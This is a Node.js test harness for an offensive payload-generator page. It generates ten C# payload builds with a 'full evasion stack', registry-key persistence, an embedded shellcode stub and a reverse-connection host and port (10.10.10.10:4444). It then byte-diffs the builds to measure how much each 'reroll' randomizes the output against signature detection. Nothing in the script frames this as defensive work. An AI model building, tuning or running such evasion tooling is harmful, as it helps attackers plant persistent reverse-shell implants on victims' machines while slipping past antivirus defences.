#!/usr/bin/env node
/* =====================================================================
 * _t-poly.js — quantify effective polymorphism of REROLL
 *
 * Generates N consecutive OPSEC C# builds headlessly (same sandbox as
 * validate-builds.js), then byte-diffs each consecutive pair:
 *   - total bytes per build (UTF-8)
 *   - differing byte count + fraction (%)
 *   - same stats with the build timestamp normalized away
 *   - identical prefix/suffix (the stable skeleton)
 *   - line-level stability + uniqueness across all N builds
 * ===================================================================== */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.join(__dirname, '..');
const HTML = fs.readFileSync(path.join(ROOT, 'payload-forge.html'), 'utf8');
const SCRIPT = HTML.match(/<script>([\s\S]*?)<\/script>/)[1];
const SHELL_HEX = 'fc4883e4f0e8c00000004151415052';

/* --- same stub DOM / sandbox as validate-builds.js ------------------ */
const makeEl = () => ({
  value: '', textContent: '', innerHTML: '',
  style: {}, dataset: {}, files: null, _h: 0,
  classList: { add(){}, remove(){}, toggle(){}, contains: () => false },
  addEventListener(){}, removeEventListener(){}, appendChild(){}, remove(){},
  querySelector: () => makeEl(), querySelectorAll: () => [],
  getBoundingClientRect: () => ({ left: 0, width: 100 }),
  closest: () => makeEl(), matches: () => false, click(){},
  set onclick(f){}, set onchange(f){},
});
const BOOTSTRAP = `
;globalThis.__PF = {
  applyPreset, update, PRESETS, S,
  setShell: v => { els.shell.value = v; },
  setLhost: v => { els.lhost.value = v; },
  setLport: v => { els.lport.value = v; },
  getCur: () => cur.code,
};`;
const stubSS = { store:{}, getItem:k => (k in this.store ? this.store[k] : null) };
const sandbox = {
  document: {
    getElementById: id => (sandbox.els[id] = sandbox.els[id] || makeEl()),
    createElement: () => makeEl(),
    querySelector: () => makeEl(),
    querySelectorAll: () => [],
    addEventListener(){}, removeEventListener(){},
    documentElement: { style: { setProperty(){} } },
  },
  window: { addEventListener(){}, removeEventListener(){}, devicePixelRatio: 1 },
  navigator: {},
  sessionStorage: { getItem:()=>null, setItem(){}, removeItem(){} },
  localStorage: { getItem:()=>null, setItem(){}, removeItem(){} },
  btoa: s => Buffer.from(s, 'binary').toString('base64'),
  atob: s => Buffer.from(s, 'base64').toString('binary'),
  TextEncoder, TextDecoder,
  Blob: class { constructor(){ this.size = 0; } },
  URL: { createObjectURL: () => 'blob:stub', revokeObjectURL(){} },
  performance: { now: () => Date.now() },
  requestAnimationFrame: () => 0, cancelAnimationFrame(){},
  setTimeout: () => 0, clearTimeout(){}, setInterval: () => 0, clearInterval(){},
  console, Math, Date, JSON, Promise, Array, Object, String, Number, Boolean, RegExp, Error,
  els: {},
};
sandbox.globalThis = sandbox;
sandbox.window = sandbox.window;
const ctx = vm.createContext(sandbox);
vm.runInContext(SCRIPT + BOOTSTRAP, ctx, { filename: 'payload-forge.html' });
const PF = sandbox.__PF;

/* --- generate N consecutive rerolls --------------------------------- */
const N = 10;
const builds = [];
for (let i = 0; i < N; i++) {
  PF.S.plat = 'win';
  PF.applyPreset('opsec');          // full evasion stack, fmt=cs, persist=regkey
  PF.setShell(SHELL_HEX);
  PF.setLhost('10.10.10.10');
  PF.setLport('4444');
  PF.S.fmt = 'cs'; PF.S.wrapper = 'none';
  PF.update();                      // = clicking REROLL
  builds.push(PF.getCur());
}

/* --- byte diff helpers ---------------------------------------------- */
const normTs = s => s.replace(/\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} UTC/g, '<ts>');
const buf = s => Buffer.from(s, 'utf8');

function byteDiff(a, b) {
  const A = buf(a), B = buf(b);
  const n = Math.max(A.length, B.length);
  let diff = 0;
  for (let i = 0; i < n; i++) if (A[i] !== B[i]) diff++;
  // identical prefix / suffix
  let p = 0;
  while (p < A.length && p < B.length && A[p] === B[p]) p++;
  let s2 = 0;
  while (s2 < A.length - p && s2 < B.length - p &&
         A[A.length - 1 - s2] === B[B.length - 1 - s2]) s2++;
  return { totalA: A.length, totalB: B.length, diff, prefix: p, suffix: s2 };
}

// Shift-immune content diff: line-aligned, weighted by the byte length of
// the lines that actually differ. (Positional byte diff is inflated by
// variable-length lines near the top shifting every later byte.)
function contentDiff(a, b) {
  const A = a.split('\n'), B = b.split('\n');
  const n = Math.max(A.length, B.length);
  let diffBytes = 0, total = 0;
  for (let i = 0; i < n; i++) {
    const la = A[i] || '', lb = B[i] || '';
    const ba = Buffer.byteLength(la), bb = Buffer.byteLength(lb);
    total += Math.max(ba, bb);
    if (la !== lb) diffBytes += Math.max(ba, bb);
  }
  return { diffBytes, total };
}

const normed = builds.map(normTs);
const results = [];
for (let i = 1; i < N; i++) {
  const raw = byteDiff(builds[i - 1], builds[i]);
  const nm = byteDiff(normed[i - 1], normed[i]);
  const content = contentDiff(normed[i - 1], normed[i]);
  results.push({ raw, nm, content });
}

/* --- line-level stability across ALL builds ------------------------- */
const lineCounts = new Map();
for (const b of normed) for (const l of b.split('\n')) lineCounts.set(l, (lineCounts.get(l) || 0) + 1);
const totalLines = normed[0].split('\n').length;
const stableLines = [...lineCounts.values()].filter(c => c === N).length;
const unique = new Set(normed).size;

/* --- report --------------------------------------------------------- */
const avg = arr => arr.reduce((s, x) => s + x, 0) / arr.length;
const f = (raw, nm, content) => {
  const frac = d => (d.diff / Math.max(d.totalA, d.totalB) * 100).toFixed(1);
  const cf = d => (d.diffBytes / d.total * 100).toFixed(1);
  const total = raw.totalA;
  return `${total} B build · CONTENT ${content.diffBytes}/${content.total} B changed per reroll (${cf(content)}%)` +
         `\n  positional byte diff (shift-inflated): ${frac(raw)}% · ts-normalized: ${frac(nm)}%` +
         `\n  stable skeleton: ${raw.prefix}B identical prefix + ${raw.suffix}B identical suffix`;
};
console.log('=== OPSEC C# REROLL POLYMORPHISM ===');
console.log(`builds: ${N} consecutive rerolls (full evasion stack, 15 B shellcode, regkey persist)`);
console.log(`uniqueness: ${unique}/${N} distinct files`);
for (let i = 1; i < N; i++) {
  console.log(`\nreroll #${i}→#${i + 1}:`);
  console.log('  ' + f(results[i - 1].raw, results[i - 1].nm, results[i - 1].content).replace(/\n/g, '\n  '));
}
const meanPct = arr => avg(arr.map(x => x * 100));
console.log('\n--- aggregate (consecutive-pair mean) ---');
console.log('  CONTENT change per reroll (shift-immune): ' + avg(results.map(r => r.content.diffBytes)) + ' bytes'
  + ` of ~${Math.round(avg(results.map(r => r.content.total)))} B (${meanPct(results.map(r => r.content.diffBytes / r.content.total)).toFixed(1)}%)`);
console.log('  positional byte diff (shift-inflated):   ' + meanPct(results.map(r => r.raw.diff / Math.max(r.raw.totalA, r.raw.totalB))).toFixed(1) + '%');
console.log('  stable lines (identical across all ' + N + '): ' + stableLines + '/' + totalLines
  + ` (${(100 - stableLines / totalLines * 100).toFixed(0)}% of lines re-randomized)`);

/* --- what actually changes: line diff of the first pair ------------- */
console.log('\n--- differing lines, reroll #1→#2 (context) ---');
const a = normed[0].split('\n'), b = normed[1].split('\n');
let shown = 0;
for (let i = 0; i < Math.max(a.length, b.length); i++) {
  if (a[i] === b[i]) continue;
  const ctx = (a[i] || '').trim() ? a[i].trim().slice(0, 78) : (b[i] || '').trim().slice(0, 78);
  console.log('  L' + (i + 1) + '  ' + ctx + (ctx.length >= 78 ? '…' : ''));
  if (++shown >= 14) { console.log('  … (+' + (a.length - i - 1) + ' more lines)'); break; }
}
